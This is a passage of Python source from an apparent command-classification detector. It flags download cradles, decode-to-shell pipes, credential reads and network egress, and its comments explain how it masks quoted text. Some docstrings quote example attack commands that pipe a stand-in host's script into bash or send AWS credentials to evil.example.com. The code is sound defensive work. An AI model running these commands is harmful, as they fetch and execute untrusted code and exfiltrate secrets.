    if not command or "<<" not in command:
        return []
    found: list[ExecutedHeredoc] = []
    n = len(command)
    i = 0
    quote: str | None = None
    simple_start = 0
    while i < n:
        ch = command[i]
        if quote is None:
            if ch in "|&;\n":
                simple_start = i + 1
                i += 1
                continue
            match = _HEREDOC_OPEN.match(command, i)
            if match:
                kind, interp = _heredoc_consumer(command[simple_start:i])
                body_start, body_end, resume = _heredoc_span(command, match)
                if kind and body_start < body_end:
                    found.append(ExecutedHeredoc(
                        kind, interp, command[body_start:body_end], match.start(),
                    ))
                if kind == "shell":
                    # Scan the body so a nested heredoc is judged on its own.
                    i = match.end()
                    continue
                i = resume
                continue
            if ch in "'\"":
                quote = ch
            i += 1
            continue
        if ch == "\\" and quote == '"' and i + 1 < n:
            i += 2
            continue
        if ch == quote:
            quote = None
        i += 1
    return found


def _short_cluster_has(flag: str, letter: str) -> bool:
    return flag.startswith("-") and not flag.startswith("--") and letter.lower() in flag[1:].lower()


def _base64_decode_flag(args: list[str]) -> bool:
    for arg in args:
        low = arg.lower()
        if low in ("-d", "-D", "--decode"):
            return True
        if _short_cluster_has(arg, "d"):
            return True
    return False


def _segment_decoder(segment: str) -> str | None:
    """'b64', 'hex', or 'opaque' when this pipeline segment decodes.

    Encoding is not decoding. `echo hello | base64` (no `-d`) is how people
    wrap a blob, and flagging it would fire on ordinary scripts.
    """
    tokens = _strip_wrappers(_command_tokens(segment))
    if not tokens:
        return None
    prog = _prog(tokens[0])
    args = tokens[1:]
    low = [arg.lower() for arg in args]
    if prog in ("base64", "basenc"):
        if prog == "basenc" and "--base64" not in low and "-base64" not in low:
            return None
        return "b64" if _base64_decode_flag(args) else None
    if prog == "openssl":
        if "-d" not in low and "--decode" not in low:
            return None
        if "base64" in low or any(arg in ("-a", "-base64", "--base64") for arg in low):
            return "b64"
        return "opaque"
    if prog == "xxd":
        reversing = any(arg in ("-r", "--reverse") or _short_cluster_has(arg, "r") for arg in args)
        if not reversing:
            return None
        plain = any(arg in ("-p", "--plain") or _short_cluster_has(arg, "p") for arg in args)
        return "hex" if plain else "opaque"
    if prog == "certutil":
        if any(arg == "-decodehex" or arg.startswith("-decodehex") for arg in low):
            return "hex"
        if any(arg == "-decode" or (arg.startswith("-decode") and "hex" not in arg) for arg in low):
            return "b64"
        return None
    if _is_python(prog) and "-m" in low and "base64" in low and _base64_decode_flag(args):
        return "b64"
    return None


def _segment_is_interpreter(segment: str) -> bool:
    tokens = _strip_wrappers(_command_tokens(segment))
    if not tokens:
        return False
    prog = _prog(tokens[0])
    args = tokens[1:]
    if prog in _SHELLS and _shell_reads_stdin(prog, args):
        return True
    if prog in ("eval", "iex", "invoke-expression"):
        return True
    if _is_lang(prog) and _lang_reads_stdin(prog, args):
        return True
    return False


def _pipelines(text: str) -> list[list[str]]:
    """Pipelines split on a single `|`. `||` and `;` end a pipeline.

    A character scan, not a regex, so a long command cannot backtrack.
    """
    pipelines: list[list[str]] = []
    parts: list[str] = []
    buf: list[str] = []
    i = 0
    n = len(text)

    def flush() -> None:
        parts.append("".join(buf))
        buf.clear()
        cleaned = [part.strip() for part in parts if part.strip()]
        if len(cleaned) >= 2:
            pipelines.append(cleaned)
        parts.clear()

    while i < n:
        ch = text[i]
        if ch == "|" and i + 1 < n and text[i + 1] == "|":
            flush()
            i += 2
            continue
        if ch == "|":
            parts.append("".join(buf))
            buf.clear()
            i += 1
            continue
        if ch in ";&\n":
            flush()
            i += 1
            continue
        buf.append(ch)
        i += 1
    flush()
    return pipelines


def _decode_pipe_kind(written: str) -> str | None:
    """How a decoder reaches an interpreter, or None.

    The interpreter has to be downstream of the decoder. `bash | base64 -d`
    is the other direction. An intermediate `tr` is allowed: the bytes still
    arrive at the shell.
    """
    if not written:
        return None
    rank = {"b64": 3, "hex": 2, "opaque": 1}
    best: str | None = None
    for pipeline in _pipelines(written):
        kinds: list[tuple[int, str]] = []
        interpreters: list[int] = []
        for index, segment in enumerate(pipeline):
            kind = _segment_decoder(segment)
            if kind:
                kinds.append((index, kind))
            if _segment_is_interpreter(segment):
                interpreters.append(index)
        if not kinds or not interpreters:
            continue
        for index, kind in kinds:
            if any(later > index for later in interpreters):
                if best is None or rank[kind] > rank[best]:
                    best = kind
    return best


def decode_piped_to_interpreter(command: str) -> bool:
    """True when a decoder's output is piped into a shell or interpreter.

    Quoted text is masked first, so `echo 'base64 -d | sh'` does not match.
    """
    if not command:
        return False
    return _decode_pipe_kind(mask_literals(command)) is not None


def inline_decoded_commands(command: str) -> list[str]:
    """Plaintext of inline blobs a decode-pipe would feed to an interpreter.

    Empty when the shape is absent, the blob is not inline, or it does not
    decode to text. At most two payloads, each at most 8 KiB.
    """
    if not command:
        return []
    kind = _decode_pipe_kind(mask_literals(command))
    if kind not in ("b64", "hex"):
        return []
    return _inline_decoded(command, kind)


def _decode_token(token: str, kind: str) -> str | None:
    if kind == "b64":
        pad = "=" * ((-len(token)) % 4)
        try:
            data = base64.b64decode(token + pad, validate=True)
        except (binascii.Error, ValueError):
            return None
    else:
        if len(token) % 2:
            return None
        try:
            data = bytes.fromhex(token)
        except ValueError:
            return None
    if not data or len(data) > 8192 or b"\x00" in data:
        return None
    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return None
    if not text.strip():
        return None
    return text


def _inline_decoded(command: str, kind: str) -> list[str]:
    """At most two inline payloads. The pipe shape is the signal; decoding
    is extra, and only while the blob is in the command and bounded."""
    pattern = _B64_TOKEN if kind == "b64" else _HEX_TOKEN
    found: list[str] = []
    for match in pattern.finditer(command):
        text = _decode_token(match.group(0), kind)
        if not text:
            continue
        found.append(text)
        if len(found) >= 2:
            break
    return found


def _language_program_traits(body: str) -> list[str]:
    """Traits of a python/node/perl/ruby/php program passed via heredoc."""
    traits: list[str] = []
    written = mask_literals(body)
    literal = mask_literals(body, include_double=False)
    if (
        CREDENTIAL_PATH.search(literal)
        or ENV_FILE.search(literal)
        or CREDENTIAL_ENV.search(body)
        or CREDENTIAL_ENV_DUMP.search(written)
        or CREDENTIAL_CLI.search(written)
    ):
        traits.append("credential_access")
    if PRIVATE_KEY_PATH.search(literal):
        traits.append("private_key")
    if _LANG_NET.search(body) and reaches_remote_host(body):
        traits.append("net_egress")
    kind = _decode_pipe_kind(written)
    if kind:
        traits.append("decode_pipe")
        traits.append("encoded_cmd")
        traits.append("risky_exec")
    return [trait for trait in traits if trait in _LANG_PROGRAM_TRAITS_FROM_BODY]


def mask_literals(command: str, *, include_double: bool = True) -> str:
    """Blank out quoted strings and heredoc bodies, preserving length and layout.

    `include_double=False` masks only the constructs the shell treats as fully
    literal: single quotes and heredoc bodies. Double quotes still expand `$VAR`
    and command substitutions, so their contents are live text, not data. That
    distinction is the whole reason this takes a flag: masking double quotes
    everywhere would blank `"$AWS_SECRET_ACCESS_KEY"` and lose a real credential
    dereference, while not masking them at all leaves the false positives.

    Trait regexes match command text, which cannot tell performing an action from
    writing about one. A command whose *content* was the string
    `gh pr merge 42 --squash` fired `pr-merged-without-review` at critical, and no
    pull request was merged: the text was being written into a test fixture.

    That failure lands hardest on the people most likely to adopt this. Anyone
    authoring detection content, security documentation, or corpus cases spends
    their day typing the exact strings the rules hunt for, and a security tool
    that punishes you for writing about security gets uninstalled.

    Masking rather than deleting keeps every offset intact, so a caller can still
    reason about where in the original command a match sat.

    This is a heuristic and is meant to be. Full shell quoting is a parser's job,
    and a parser that is wrong about an exotic case fails closed in a way nobody
    can debug from a hashed command. The shapes handled here -- single quotes,
    double quotes, heredocs -- are the ones that actually produced false
    positives. Anything it cannot account for stays visible, so the failure mode
    is a trait that still fires rather than one that silently stops.
    """
    if not command or not isinstance(command, str):
        return command or ""

    out = list(command)
    i = 0
    n = len(command)
    quote: str | None = None
    # A heredoc fed to an interpreter is the program (#345). Blanking it hid
    # `bash <<EOF` / `python - <<PY` the same way it correctly hides
    # `git commit -F - <<EOF`. Only the shell case stays visible here, so the
    # command-word patterns see the body. A python/node body is not shell and
    # is classified on its own; leaving it visible would flag comments.
    shell_heredocs = {
        item.opener for item in executed_heredocs(command) if item.kind == "shell"
    }

    while i < n:
        ch = command[i]

        if quote is None:
            # A heredoc body is content by definition, whatever it contains,
            # unless an interpreter is going to execute it.
            m = _HEREDOC_OPEN.match(command, i)
            if m:
                if m.start() in shell_heredocs:
                    i = m.end()
                    continue
                delimiter = m.group(2)
                body_start = command.find("\n", m.end())
                if body_start == -1:
                    i = m.end()
                    continue
                body_start += 1
                end = n
                for line_start, line in _iter_lines(command, body_start):
                    if line.strip() == delimiter:
                        end = line_start
                        break
                for j in range(body_start, min(end, n)):
                    if out[j] != "\n":
                        out[j] = " "
                i = min(end, n)
                continue
            if ch == "'" or (ch == '"' and include_double):
                quote = ch
                out[i] = " "
            i += 1
            continue

        # Inside a quote.
        if ch == "\\" and quote == '"' and i + 1 < n:
            out[i] = " "
            out[i + 1] = " "
            i += 2
            continue
        if ch == quote:
            quote = None
            out[i] = " "
            i += 1
            continue
        if ch != "\n":
            out[i] = " "
        i += 1

    return "".join(out)


def _iter_lines(text: str, start: int):
    """(offset, line) for each line from `start`, so a heredoc end can be located."""
    idx = start
    while idx < len(text):
        nl = text.find("\n", idx)
        if nl == -1:
            yield idx, text[idx:]
            return
        yield idx, text[idx:nl]
        idx = nl + 1


def pipes_only_loopback(command: str) -> bool:
    """True when every URL in a pipe-to-interpreter command points at this host.

    `curl http://127.0.0.1:8000/api/v1/audit/status | python -c ...` has the exact
    shape of a download cradle and none of the substance: nothing crosses the
    network and nothing untrusted is executed. Querying your own dev server and
    piping the JSON into an interpreter is a thing developers do several times an
    hour, and this fired at critical on it.

    That is not a cosmetic problem. A critical which fires several times a day on
    normal work does not stay a critical: it becomes the alert people learn to
    scroll past, and by the time a real cradle appears the rule has already lost
    its reader. The DLP manifest records the same lesson from the other side,
    where a bare 40-char pattern matched every git commit SHA.

    Deliberately conservative in two ways.

    Loopback is excluded specifically, rather than remote being required. An
    earlier version of the rule demanded a bare IP address, which let
    `curl https://evil-cdn.example.com/x.sh | bash` straight through -- and a
    domain is what a real attacker uses. Any host that is not provably loopback
    keeps the full-strength trait.

    A command with no URL we can read is treated as remote. `curl $URL | bash`
    resolves at runtime, so we cannot prove where it points, and guessing in the
    quiet direction is how a recorder goes blind.
    """
    hosts = URL_HOST.findall(command or "")
    if not hosts:
        return False
    return all(LOOPBACK_HOST.match(h) for h in hosts)


def classify_command(command: str, *, _depth: int = 0) -> list[str]:
    """Map a plaintext command to detection trait labels (never the text itself).

    `_depth` stops a decoded payload from being decoded again. One inline
    decode is enough; a second layer still carries `decode_pipe` from the
    outer shape.

    Three views of the same string, because "does this command do X" and "does
    this command mention X" are different questions and the regexes cannot tell
    them apart on their own:

    ``spoken``
        The raw text. Used only where the shell itself would still act on
        quoted content, which in practice means variable expansion.

    ``written``
        Quotes and heredocs blanked. Used for **command words** -- the verbs and
        operators. `curl`, `| bash`, `rm -rf`, `gh pr merge`. A command word
        inside quotes is not a command, it is an argument to `echo`.

    ``literal``
        Single quotes and heredocs blanked, double quotes left alone. Used for
        **arguments** such as paths. `cat "$HOME/.aws/credentials"` is a real
        read and must fire; `echo 'cat ~/.aws/credentials'` is prose.

    The rule that falls out of this, and the one worth remembering: *the verb
    must be unmasked, the arguments may be quoted*. Issue #41 proposed masking
    everything for every trait, which fixes the false positives and silently
    breaks `curl "https://evil.example.com/x.sh" | bash`, where quoting the URL
    is simply how people write it. Trading a visible false positive for an
    invisible false negative is a bad trade for a recorder.
    """
    if _depth > 2 or not command or not isinstance(command, str):
        return []
    traits: list[str] = []

    spoken = command
    written = mask_literals(command)
    literal = mask_literals(command, include_double=False)
    # Only the outer command is decoded. The payload is classified once.
    decode_kind = _decode_pipe_kind(written) if _depth == 0 else None

    # The IP may legitimately sit inside quotes; the fetch verb may not.
    remote_ips = [ip for ip in RAW_IP_URL.findall(spoken) if not LOOPBACK_IP.match(ip)]
    if remote_ips and DOWNLOAD_EXEC.search(written):
        traits.append("raw_ip_fetch")
    if ENCODED_CMD.search(written) or decode_kind:
        traits.append("encoded_cmd")
    if decode_kind:
        traits.append("decode_pipe")
    cradle = PIPE_TO_SHELL.search(written) or PROC_SUBST_EXEC.search(written)
    if cradle:
        traits.append(
            "pipe_to_shell_local" if pipes_only_loopback(spoken) else "pipe_to_shell"
        )
    if CLOUD_API.search(written):
        traits.append("cloud_api")
    if GIT_EXFIL.search(written):
        traits.append("git_exfil")
    if STAGING_HOST.search(spoken) and (
        STAGING_FETCH.search(written) or DOWNLOAD_EXEC.search(written)
    ):
        traits.append("staging_fetch")
    if not BENIGN_AFTER_STAGING.search(written) and (
        cradle or RISKY_EXEC_AFTER_STAGING.search(written) or decode_kind
    ):
        traits.append("risky_exec")
    if DELETE_COMMAND.search(written):
        traits.append("delete_cmd")
    if UNTRUSTED_INPUT_COMMAND.search(written):
        traits.append("untrusted_input")

    # Credential access. The env-var forms read `spoken` on purpose: `$SECRET`
    # expands inside double quotes, so `echo "$AWS_SECRET_ACCESS_KEY"` is a real
    # dereference. Path forms read `literal`, which is what stops a heredoc full
    # of source code from being read as a credential read (#40).
    if (
        CREDENTIAL_PATH.search(literal)
        or ENV_FILE.search(literal)
        or CREDENTIAL_ENV.search(spoken)
        or CREDENTIAL_ENV_DUMP.search(written)
        # A command word, so `written`: writing `aws secretsmanager
        # get-secret-value` into a runbook is not reading a secret.
        or CREDENTIAL_CLI.search(written)
    ):
        traits.append("credential_access")
    if PRIVATE_KEY_PATH.search(literal):
        traits.append("private_key")

    # Egress as a fact about one event. `credential-exfil` needed a *later*
    # event tagged TA0011, so a command that both read a secret and sent it --
    # `cat ~/.aws/credentials | curl -d @- https://evil.example.com` -- produced
    # one credential-access event, no second half, and no finding (#42). One
    # event can carry two facts; the technique field can only carry one, so the
    # second one lives here.
    if reaches_remote_host(spoken) and (
        NETWORK_CLIENT.search(written)
        or INTERPRETER_NETWORK.search(
            interpreter_network_text(spoken, literal, written)
        )
    ):
        traits.append("net_egress")
    # `fetched_files`, not `FETCH_TO_FILE`. The latter is only a tool-name gate
    # since curl's download flags stopped fitting one pattern, and using it here
    # labelled every remote `curl` as a download to disk.
    if reaches_remote_host(spoken) and fetched_files(written):
        traits.append("fetch_to_file")

    # The PR traits read `written`: a command that *writes* `gh pr merge` into a
    # file is not merging anything, and treating it as though it were fired
    # `pr-merged-without-review` at critical on someone authoring a test fixture
    # (issue #24).
    if PR_DESC_COMMAND.search(written):
        traits.append("pr_desc")
    if PR_COMMIT_COMMAND.search(written):
        traits.append("pr_commit")
    if PR_MERGE_COMMAND.search(written):
        traits.append("pr_merge")

    if _depth == 0:
        for heredoc in executed_heredocs(command):
            if heredoc.kind != "lang" or not heredoc.body:
                continue
            for trait in _language_program_traits(heredoc.body):
                if trait not in traits:
                    traits.append(trait)
        if decode_kind in ("b64", "hex"):
            for payload in inline_decoded_commands(command):
                for trait in classify_command(payload, _depth=_depth + 1):
                    if trait not in traits:
                        traits.append(trait)
    return traits
